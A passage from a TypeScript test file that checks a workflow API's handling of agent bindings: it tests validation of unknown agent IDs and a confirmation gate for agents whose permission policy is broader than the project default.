    });
  });

  afterEach(() => {
    store.close();
    rmSync(rootDir, { recursive: true, force: true });
    rmSync(globalDir, { recursive: true, force: true });
  });

  const post = (path: string, body: unknown) =>
    request(app, "POST", path, JSON.stringify(body), { "content-type": "application/json" });
  const patch = (path: string, body: unknown) =>
    request(app, "PATCH", path, JSON.stringify(body), { "content-type": "application/json" });
  const get = (path: string) => request(app, "GET", path);

  it("persists a valid agent binding and round-trips it through GET", async () => {
    const agentId = await makeAgent({});
    const res = await post("/api/workflows", { name: "Bound", ir: boundIr({ agentId, mode: "defer" }) });
    expect(res.status).toBe(201);
    const id = (res.body as { id: string }).id;

    const fetched = await get(`/api/workflows/${id}`);
    expect(fetched.status).toBe(200);
    const ir = (fetched.body as { ir: { columns: Array<{ id: string; agent?: { agentId: string; mode: string } }> } }).ir;
    const triage = ir.columns.find((c) => c.id === "triage");
    expect(triage?.agent).toEqual({ agentId, mode: "defer" });
  });

  it("rejects an unknown agentId with a 400 naming the column; definition is unchanged", async () => {
    const res = await post("/api/workflows", { name: "Ghost", ir: boundIr({ agentId: "agent-ghost", mode: "defer" }) });
    expect(res.status).toBe(400);
    expect(res.body.error).toMatch(/triage/);
    expect(res.body.error).toMatch(/agent-ghost/);
    // Nothing persisted (no custom "Ghost" workflow created; built-ins remain).
    const list = await get("/api/workflows");
    expect((list.body as Array<{ name: string }>).some((w) => w.name === "Ghost")).toBe(false);
  });

  it("rejects a more-privileged agent without confirmPolicyEscalation, then persists with the flag", async () => {
    // Project default is restrictive; the bound agent is unrestricted (broader).
    await store.updateSettings({ defaultAgentPermissionPolicy: { rules: { file_write_delete: "block" } } as never });
    const agentId = await makeAgent({ permissionPolicy: { presetId: "unrestricted" } });

    const denied = await post("/api/workflows", { name: "Esc", ir: boundIr({ agentId, mode: "override" }) });
    expect(denied.status).toBe(400);
    expect(denied.body.error).toMatch(/broader/i);
    expect((denied.body as { details?: { policyEscalation?: boolean } }).details?.policyEscalation).toBe(true);

    const ok = await post("/api/workflows", {
      name: "Esc2",
      ir: boundIr({ agentId, mode: "override" }),
      confirmPolicyEscalation: true,
    });
    expect(ok.status).toBe(201);
  });

  it("saves without the flag when the agent policy equals the project default (no escalation)", async () => {
    // Project default and the bound agent are both fully restrictive (locked-down):
    // equal policies are NOT broader, so no confirmation is required.
    await store.updateSettings({
      defaultAgentPermissionPolicy: { rules: { file_write_delete: "block", command_execution: "block" } } as never,
    });
    const agentId = await makeAgent({
      permissionPolicy: { presetId: "custom", rules: { file_write_delete: "block", command_execution: "block" } },
    });
    const res = await post("/api/workflows", { name: "Equal", ir: boundIr({ agentId, mode: "override" }) });
    expect(res.status).toBe(201);
  });

  it("saves without the flag when the project default is unset (unrestricted) and the agent is unrestricted", async () => {
    // No project default configured → effective default is `unrestricted` (allow-all).
    // An unrestricted agent is equal, not broader, so no escalation.
    const agentId = await makeAgent({ permissionPolicy: { presetId: "unrestricted" } });
    const res = await post("/api/workflows", { name: "Unrestricted", ir: boundIr({ agentId, mode: "override" }) });
    expect(res.status).toBe(201);
  });

  it("still detects escalation when the agent's custom rules map omits a category the default blocks", async () => {
    // Default blocks two categories. The agent's custom rules map names only ONE
    // of them (the other is absent → resolves to the unrestricted `allow` seed),
    // so the agent is genuinely broader on the omitted category. A missing key
    // must NOT silently suppress this escalation.
    await store.updateSettings({
      defaultAgentPermissionPolicy: { rules: { file_write_delete: "block", command_execution: "block" } } as never,
    });
    const agentId = await makeAgent({
      // Only file_write_delete declared; command_execution omitted → allow (broader).
      permissionPolicy: { presetId: "custom", rules: { file_write_delete: "block" } },
    });
    const denied = await post("/api/workflows", { name: "PartialEsc", ir: boundIr({ agentId, mode: "override" }) });
    expect(denied.status).toBe(400);
    expect(denied.body.error).toMatch(/broader/i);
    expect((denied.body as { details?: { policyEscalation?: boolean } }).details?.policyEscalation).toBe(true);

    const ok = await post("/api/workflows", {
      name: "PartialEsc2",
      ir: boundIr({ agentId, mode: "override" }),
      confirmPolicyEscalation: true,
    });
    expect(ok.status).toBe(201);
  });

  it("stores no agent key when the binding is absent (omission, R9)", async () => {
    const res = await post("/api/workflows", { name: "Plain", ir: boundIr() });
    expect(res.status).toBe(201);
    const id = (res.body as { id: string }).id;
    const fetched = await get(`/api/workflows/${id}`);
    const ir = (fetched.body as { ir: { columns: Array<{ id: string; agent?: unknown }> } }).ir;
    const triage = ir.columns.find((c) => c.id === "triage")!;
    expect("agent" in triage).toBe(false);
  });

  it("PATCH validates an unknown agentId the same way as POST", async () => {
    const created = await post("/api/workflows", { name: "Editable", ir: boundIr() });
    const id = (created.body as { id: string }).id;
    const res = await patch(`/api/workflows/${id}`, { ir: boundIr({ agentId: "agent-ghost", mode: "override" }) });
    expect(res.status).toBe(400);
    expect(res.body.error).toMatch(/triage/);
  });

  it("PATCH enforces the policy-escalation gate the same way as POST (FN-5893)", async () => {
    await store.updateSettings({ defaultAgentPermissionPolicy: { rules: { file_write_delete: "block" } } as never });
    const agentId = await makeAgent({ permissionPolicy: { presetId: "unrestricted" } });

    const created = await post("/api/workflows", { name: "EditableEsc", ir: boundIr() });
    expect(created.status).toBe(201);
    const id = (created.body as { id: string }).id;

    const denied = await patch(`/api/workflows/${id}`, { ir: boundIr({ agentId, mode: "override" }) });
    expect(denied.status).toBe(400);
    expect(denied.body.error).toMatch(/broader/i);
    expect((denied.body as { details?: { policyEscalation?: boolean } }).details?.policyEscalation).toBe(true);

    const ok = await patch(`/api/workflows/${id}`, {
      ir: boundIr({ agentId, mode: "override" }),
      confirmPolicyEscalation: true,
    });
    expect(ok.status).toBe(200);
  });
});
